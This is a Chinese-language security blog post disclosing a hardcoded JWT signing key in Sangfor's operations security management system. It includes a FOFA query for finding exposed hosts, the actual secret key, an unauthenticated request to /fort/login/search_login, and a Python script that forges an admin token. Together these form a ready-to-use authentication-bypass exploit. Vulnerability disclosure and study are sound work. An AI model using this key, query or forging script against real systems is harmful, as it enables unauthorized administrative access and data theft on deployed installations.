---
title: "深信服运维安全管理系统 Jwt 密钥硬编码"
source: https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html
asset_dir: assets/深信服运维安全管理系统-jwt-密钥硬编码
---

# 深信服运维安全管理系统 Jwt 密钥硬编码

[Mrxn](https://mrxn.net/author/1)- 发表于2026/3/5 08:41
- 348浏览
- [0评论](#comment)
- 9分钟阅读

深入探索

授权

鉴权

软件

---

# 漏洞简介

深信服运维安全管理系统存在 Jwt 密钥硬编码[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。攻击者可通过分析应用程序代码或通过其他方式获取硬编码的 Jwt 密钥，利用该密钥伪造 Jwt Token，从而绕过身份认证机制，实现未授权访问系统功能或敏感信息，可能导致越权操作、[数据泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)等严重后果。

Windows安全工具

# 影响版本

低于 3.0.12 20241106

# fofa语法

> body="/fort/login" && header="FORTSESSIONID"

# 漏洞分析

起因是在测试 `/login/search_login`接口时，

[![深信服运维安全管理系统 Jwt 密钥硬编码](images/img-001-1d9bc6eb20c7.webp)](https://image.mrxn.net/ce116caf15684171b8d07d4066b99095.webp)

发现有Jwt签名部分，跟进两个方法看了下，发现硬编码的Jwt密钥

漏洞预警服务

深入探索

Docker加速服务

服务器安全服务

编码转换工具

[![深信服运维安全管理系统 Jwt 密钥硬编码](images/img-002-59b6606af699.webp)](https://image.mrxn.net/5a87e37bb75440ceb4035292729c3825.webp)

Jwt硬编码密钥为 `69fad654821b991725e62fb65ee464da`

# 漏洞复现

[![深信服运维安全管理系统 Jwt 密钥硬编码](images/img-003-95edf58edb9c.webp)](https://image.mrxn.net/4c6f5f6e3a4f4370a520ceda847556a4.webp)

## POC

> [未授权](https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83)获取actionToken、accessToken
>
> 网络安全

```
GET /fort/login/search_login HTTP/1.1
Host: sangfor_osm.mrxn.net
```

伪造合法的Jwt签名token

> 伪造一个登录用户名 admin

```
import jwt
import time

# 从代码中获取的硬编码密钥
SECRET_KEY = "69fad654821b991725e62fb65ee464da"

# 伪造的用户信息
payload = {
    "loginName": "admin",
    "userId": "1000000000001",
    "exp": int(time.time()) + 43200  # 设置一个未来的过期时间
}

# JWT Header
headers = {
  "typ": "JWT",
  "alg": "HS256"
}

# 使用获取的密钥签名，生成伪造的token
forged_token = jwt.encode(payload, SECRET_KEY, algorithm="HS256", headers=headers)

print(forged_token)
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#未授权](https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83)
- [#泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.POC](#toc-5-1-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALXElEQVR4Aeyb23bjthJEtfP//zxJu2ZTRBMQJc/E0gO9DqZYl27CaMqW7ZN/brfbr++sX+1j1aPFDvfSt77zrndfXrjKllfrzK9MrZ6Ti5XZr67Lv4M1kP/qrv99yglsA/lv4rdn1nc3DtyAwz16P0hupcPoQzjce0M0e8Br3LqOng+kHwR7Tm7+DM0XbgMpcq33n8BhIJCpw4irrUJy/SkwD/HlIoy69fryV9DaM7QnjHuA8O6v+Nl99CF9YUT9PR4Gsjev658/gb82EMj0+6fg06UO8xxENw/hMKJ9HqE9VhlIT3OieYi/4upir1f/Dv61gXzn5lfN8QT+eCA+HSLMny59t/BdDukP5/jsvSC93JO4qj/T9b+DfzyQ79z0qlmfwGEgPh0d1y3iwO4p+1U/kEe3D8z9pI7/QvI6MHL7zvCsRv9ZhNzbe0H4s/XWdZzVHwYyC13az53ANhDI1OEx9q1B8k4fnuP2geQ7t5965+qQekBpQ2uAr98SaMDI1UWIb736CiH57kN0eIz7um0ge/G6ft8J/ONT8Cq6ZesgT4E6hOurdzzze75z6wu71zmMe4I5tw7iy8W6Vy147Ffm1XW9QjzlD8HlQCDTh6D7hXAIqvskrPhKh/SBoH0g3DqYc4gOd7RGtKcIyerDyM2Jr+bMd4TcB4LdL74cSJnX+vkT+AfW06rt9Kek88rsV/ch/WGOPb/vNbvueXnhLF8ajPcubb+qdr/gcR5GHx5z77W/R12r7/F6hexP4wOut3dZME657w3mPow6jLz3kdcTUguSr+ta3S/t9/r6a6P+IzTfM+qiPmQPEFTvaF3HsxyMfWHOgdv1Crl91sfTA1k9Fep+Wp2ri/qQp0SuD9HlHWHt917WqsO8Vt+8qC6qizD26zkYfRi5ffb49ED2Rdf1/3cCh3dZTln01pDpQrDrK24f0Vzn8Fpf+0Dq4Bx7jfwMIb3NwchXn0vXrV/p5V+vkDqFD1rbu6w+NZg/BT0nF/vnBukDI5qD6HL7iOqvoLUr7L1gvoee69z+6jD2UV/lIHn9wusV4ql9CG4DgUwLgu4PwmHE7svFmvZ+qYuQfnIRRh1Gbk/ze3zkVQ7GXqXVOqvTh7EeRm5OrN61YJ4rrxbEB66fQ24f9nF4l9X316ct72idOmTq6h3NifpySL1cv6N+YfcgPbpe2W39+vX110Sgx5Z8X1vXPQh89VSvTC15x/Jc25esHrr4e05gG4gTchtyGKcN4RA0DyNX79j7Quq63rl9YMyrF0I8CNqjvFcWpN4aCH+1H6QOgvYTZ/22gRi68L0nsP0cApmiU4Nwt6feEZJTN3+GPQ/pYx2MXL3Xqc8Q0gOCs8xMW90D0geC1kI4BNU79r5wzF+vkH5qb+aHgUCm1qfpPiG+fJXTF3sO0kddNC92HVKnD+Fw/y+orBHNinCvAZQ3BL7eJUFw1Wcr+H3Rc3IR0g+CM/0wkN+9L3jTCWw/hzgtcbWf7kOmDUHrznIrv+u9nz6M96scRIMRy9sve6jJxa53fpYzv8JVfenXK2R1am/SD++yIE9X3w9EhxHPcvo1/f2CeR+IbhbCIWi/V9Be4qoWxntAOAStg3AIqu9wetnvD8f66xUyPbr3icuBwHF6tc0+5dJqqXeE9IERq2a2rJ95e83cHvX3Wl3DeG8IN3+G1aPWKgfpB8Geg+gwYvWstc8vB7IPXdc/dwKHd1neuiZXSy5CpiwXITqMqF+9asnF0vZLHdJHr+sQH+64yvQenUN6WC+ag9FXF813hOfqIDng+nvI7cM+ti9ZkCm5Pxi5T0NH812X68O8H0SHoHkRovd+8hlaK0J6yDvaQ10OqZPrQ3S5aK6jPqQORtQv3AZS5FrvP4GXBwKZ7mrrEB+C5vpTA6NvDqL3vH5HSB7o1tf/F7j6aNR1LbkIfP3uSi5WthbEh2Bptcx1hOS6XjWztc+9PJB98XX990/gGsjfP9M/6ngYyP4lVde9e2m1ug7zl2nPfZfDvH/txdV7Q2q6D3P91fqel/f7qXeE7GOvHwayN6/rnz+Bw0DgOLXaFkSHEcvbL58OUQ9SJ+9oXoTkIahuHUSHI5rpNeoipHaVU4fkrBNh1CEcRlzl7a9feBhIidd63wlsv37vW4BMWd1prtAcpA6C6tbBqOtDdAiaFyG6eVG/sGtyeFwLcx+iV+9a9qvrWs9ycyKkLwTVC69XSJ3CB61tIDXxWn1vpdWCTBNGXOWrppY+pE5e3n6pi5A8BPfZ/bX5PUJq1MzDqEO4vnkYdZjznpeLva9cNLfHbSB78bp+3wlsv37vW3CKkKdDX12E+J2bF/XlIoz16h0hOQjqQzigtCHw9SsRCGq4FxHiy811hHluVQfJr/qoW194vUI8lQ/Bw7usmlKt1f7gualDctWr1r1frmD0YeRJnf9bvV09rd4Rci/z+hBd3n25aA7GOgjvObnY64HrD1S3D/s4fA+Bcbp9v32q8lVupVsHud+Kq3eE1PX+ew7JQHDv1TVEh2BptWDO3UNlakFy6jBy9crWgtGHkVf++h5SJ/VBa/seAuO03GNNbb8gOf0zhMd5e6/6QOoh2HMQHdisVU/g612XwZ7rHJJf6fYRzUHqYER98zO8XiGzU3mjdhgIjFPte3PKon7nXYf0VYdwCKqLEN2+IkQ3p77H7nVutusw720OnvPtL/Z6SJ/uV+4wkBKv9b4T2AbitDpCpukWYeTqovVysetysee63n05ZD+A0gHtBXx9D4ERLTAn76gv6kP6qUO4vnpHfUgeuH4OuX3Yx/ZzCNynBPfrvl+nDPcMsMWA6VMIo24BRD/jkBwE3Yd1hRCvrmer13QOqVeH8N4LokOw5zuH5GBE+5ov3L5kaV743hPYfg6p6exX3xY8nq75fY/9dfflK4TcT3/fq65nutoZVn0tyD0gWFotmHP7VqaW/AwrW8tcXdeC3AfueL1CPKUPwe17iPuBTKsm+GiZ/1sIue+qH8SHNVoL6wzcPfMixPPzVpdDfAjqiz234j1vrvB6hXg6H4Lb9xDI1GtKtfr+ID4Ez3xIDoLVs5Z1MOrl1dJfYWVq6dd1X3qivlxc6fqQPcrPEMY8jNx6iA5HvF4hntKH4GEgME7Nffo0dYTkzZ0hJG+fnu+6XITU97oZt0ZPLq50yD1WOetESF4u9np1UX+Ph4EYvvA9J3B4l+U2nJpchPnToH+G9oWxD4RD0Jz9ILpchOhwR70Vwj0L92vz93tHgXsGiPjEv8DXby169FH/6xXST+vNfHuX5dTE1b6e9c9y9ofxKep1EL/r8hn23pAeEJzVlNbr5OXNlr44y5SmD7k/jFgZ1/UK8bQ+BLfvITBODR7zvn8nDKnr/hm3vudWujnI/QClUwSGr+0w8t4ARh/CV3uD+L1P59ZD8sD195Dbh31sX7Kc1hn2/ZuHTFkfwle+OX05pA5G1O9ofWH3Oq/MfumrQe6pLuqvuLrY8+pi9+WF20AMX/jeEzgMBPKUwIirbUJyNd1a5uq6llyE5OUijHrV1tLvCMnDEc1W/X7BmDXX0RqY5+E5HZKzv33lMPqlHwZS4rXedwL/+0BgfAp8SkQ/dbkIY525Z9AeZmHeC6JD0DoIt/5MNyea7wjpC0F9CAeud1m3D/v441eIU+6fF2Tq3Yfo5uExN9fRvnvsGUhvM/orDsmf5Xq9eRHSB0bUf1T/xwPxJhf+nRM4DMTpdTy7HeRpsK7nuw5jHsKt6/muQ/JwRzNi7yGH1HRu3QohdRA0Zx9RvaM+pB6C+9xhIHvzuv75E9gGApkWPMbVFvv05eYhfeX6EF2uL6pDcuozNDvzntGsF62B3Ftd1BdhnjMPc9/6wm0gRa71/hO4BvL+GQw7+BcAAP//JFtPOwAAAAZJREFUAwAzpUCebIFS7AAAAABJRU5ErkJggg==)

手机扫码阅读
